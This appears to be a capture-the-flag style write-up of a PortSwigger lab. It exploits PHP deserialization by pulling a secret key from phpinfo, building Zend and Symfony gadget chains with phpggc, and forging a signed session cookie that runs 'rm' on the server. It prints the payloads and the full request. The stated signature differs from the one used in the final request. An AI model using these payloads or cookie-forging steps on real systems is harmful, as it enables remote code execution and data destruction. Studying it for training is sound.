
# Exploiting PHP deserialization with a pre-built gadget chain

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


---------------------------------------------

References: 

- https://portswigger.net/web-security/deserialization/exploiting



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/1.png)

---------------------------------------------

First intercept a request after logging in:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/2.png)


If we URL-decode it we can read the object:

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ0Zzdxczh5eTFtb2hrdTc4ZmIwYm5kMXdtdDJoNXlmYyI7fQ==","sig_hmac_sha1":"3cf317d5f0262ffc0ada548bbf83a02afdfc4463"}
``` 



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/3.png)


And decode the token:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/4.png)


From Burp we can find /cgi-bin/phpinfo:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/5.png)


From here we can find it uses Zend Engine 3.4.0:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/6.png)



We also find a secret key:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/7.png)



Using the mentioned tool we see there are payloads for Zend https://github.com/ambionics/phpggc:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/8.png)


```
./phpggc ZendFramework/FD1 /home/carlos/morale.txt   

O:25:"Zend_Http_Response_Stream":2:{s:11:"*_cleanup";b:1;s:14:"*stream_name";s:23:"/home/carlos/morale.txt";}

./phpggc ZendFramework/FD1 /home/carlos/morale.txt -b

TzoyNToiWmVuZF9IdHRwX1Jlc3BvbnNlX1N0cmVhbSI6Mjp7czoxMToiACoAX2NsZWFudXAiO2I6MTtzOjE0OiIAKgBzdHJlYW1fbmFtZSI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
```




![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/9.png)



Using this online tool (https://www.freeformatter.com/hmac-generator.html#before-output) I found the signature of the serialized object ("sig_hmac_sha1") is generated with the SECRET_KEY from phpinfo.php:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/10.png)


So we can calculate the signature for this new object the same way:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/11.png)



```
{"token":"TzoyNToiWmVuZF9IdHRwX1Jlc3BvbnNlX1N0cmVhbSI6Mjp7czoxMToiACoAX2NsZWFudXAiO2I6MTtzOjE0OiIAKgBzdHJlYW1fbmFtZSI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=","sig_hmac_sha1":"f0c54df92c8ecacafe56beb6765d6632a35259a0"}
``` 

URL-encoded:

```
%7B%22token%22%3A%22TzoyNToiWmVuZF9IdHRwX1Jlc3BvbnNlX1N0cmVhbSI6Mjp7czoxMToiACoAX2NsZWFudXAiO2I6MTtzOjE0OiIAKgBzdHJlYW1fbmFtZSI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3d%22%2C%22sig_hmac_sha1%22%3A%22f0c54df92c8ecacafe56beb6765d6632a35259a0%22%7D
```

It does not seem to delete the file:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/12.png)


From the solutions I found it is in fact Symfony even if nothing in phpinfo.php points to that technology, so the payload we generate now is:

```
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -b

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319
```

Signature is fbe3dee997e7304ff810a2806c562e5ef9523d67 so the request will be:

```
GET /my-account HTTP/2
...
Cookie: session=%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319%22%2C%22sig_hmac_sha1%22%3A%22949d68ba69539c85a418c7939d1607a6bc3be7f7%22%7D
...
```

It generates a Symfony error but the file is deleted:



![img](images/Exploiting%20PHP%20deserialization%20with%20a%20pre-built%20gadget%20chain/13.png)